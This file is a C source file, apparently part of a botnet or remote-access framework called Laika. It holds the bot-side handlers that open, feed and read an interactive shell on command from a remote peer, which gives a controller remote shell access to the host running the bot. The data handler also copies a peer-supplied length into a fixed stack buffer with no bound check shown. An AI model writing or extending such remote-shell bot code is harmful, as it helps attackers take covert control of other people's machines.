#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include "lerror.h"
#include "lmem.h"
#include "bot.h"
#include "shell.h"

/* ============================================[[ Packet Handlers ]]============================================= */

void laikaB_handleShellOpen(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    struct sLaika_bot *bot = (struct sLaika_bot*)uData;
    uint16_t cols, rows;

    /* check if shell is already open */
    if (bot->shell)
        LAIKA_ERROR("LAIKAPKT_SHELL_OPEN requested on already open shell!\n");

    laikaS_readInt(&peer->sock, &cols, sizeof(uint16_t));
    laikaS_readInt(&peer->sock, &rows, sizeof(uint16_t));

    /* open shell */
    bot->shell = laikaB_newShell(bot, cols, rows);
}

void laikaB_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    struct sLaika_bot *bot = (struct sLaika_bot*)uData;

    /* check if shell is not running */
    if (bot->shell == NULL)
        LAIKA_ERROR("LAIKAPKT_SHELL_CLOSE requested on unopened shell!\n");

    /* close shell */
    laikaB_freeShell(bot, bot->shell);
}

void laikaB_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    char buf[LAIKA_SHELL_DATA_MAX_LENGTH];
    struct sLaika_bot *bot = (struct sLaika_bot*)uData;
    struct sLaika_shell *shell = bot->shell;

    /* sanity check shell */
    if (bot->shell == NULL)
        LAIKA_ERROR("LAIKAPKT_SHELL_DATA requested on unopened shell!\n");

    /* read data buf */
    laikaS_read(&peer->sock, buf, sz);

    /* write to shell */
    laikaB_writeShell(bot, shell, buf, sz);
}

void laikaB_shellTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData) {
    struct sLaika_bot *bot = (struct sLaika_bot*)uData;

    laikaB_readShell(bot, bot->shell);
}